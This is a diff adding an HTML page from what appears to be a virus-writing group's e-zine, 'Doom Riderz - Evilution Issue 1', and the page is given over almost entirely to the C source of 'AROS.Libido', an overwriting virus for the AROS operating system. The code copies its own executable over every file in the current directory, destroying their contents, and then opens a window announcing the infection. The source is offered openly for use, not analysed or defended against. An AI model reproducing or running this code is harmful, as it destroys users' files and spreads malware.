@@ -1,0 +1,94 @@
+<html>
+<head>
+<title>Doom Riderz - Evilution Issue 1</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="../doom.css">
+<script type="text/javascript" src="../fader.js"></script>
+</head>
+<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<br>
+<div id="viewerText">
+<div id="viewerTextHeader"><a href="#">AROS.Libido by wargame</a> || <a href="bin/wargame/AROS_Libido/">Project Folder</a></div>
+<pre>
+/* This is the first virus for the AROS Os by [WarGame/doomriderz]
+* It overwrites everyfile in current dir
+* Thx to darkv0id for the name of this :) */
+
+#include &lt;stdio.h&gt;
+#include &lt;dirent.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;proto/intuition.h&gt;
+#include &lt;intuition/intuition.h&gt;
+#include &lt;sys/stat.h&gt;
+
+void PrintWindow(void)
+{
+    struct Window *payloadwin = NULL;
+    
+    payloadwin = OpenWindowTags(NULL,WA_Width,300,WA_Height,20,
+    WA_Title,"Infected by AROS.Libido by [WarGame/doomriderz]",TAG_DONE);
+    
+    if(payloadwin)
+    {
+        sleep(5);
+        CloseWindow(payloadwin);
+    }
+}
+
+int main(int argc,char *argv[])
+{
+    DIR *current_dir = NULL;
+    struct dirent *cur = NULL;
+    FILE *fp = NULL;
+    char *vircode = NULL;
+    int virsize,fd,infectnum = 0;
+    struct stat fz;
+    
+    
+    if(!(current_dir = opendir(".")))
+    {
+        exit(0);
+    }
+    
+    
+    if((fp = fopen(argv[0],"r")) == NULL)
+    {
+        exit(0);
+    }
+    
+    fd = fileno(fp);
+    fstat(fd,&fz);
+    virsize = fz.st_size;
+    
+    if((vircode = malloc(virsize)) == NULL)
+    {
+        exit(0);
+    }
+    
+    fread(vircode,virsize,1,fp);
+    fclose(fp);
+    close(fd);
+    
+    while((cur = readdir(current_dir)))
+    {
+        if((fp = fopen(cur-&gt;d_name,"w")) != NULL)
+        {
+            fwrite(vircode,virsize,1,fp);
+            fclose(fp);
+            infectnum++;
+        }
+    }
+    
+    closedir(current_dir);
+    free(vircode);
+    
+    if(infectnum &gt; 3)
+    {
+        PrintWindow();
+    }
+    
+}
+</pre>
+</div>
+</body>
+</html>
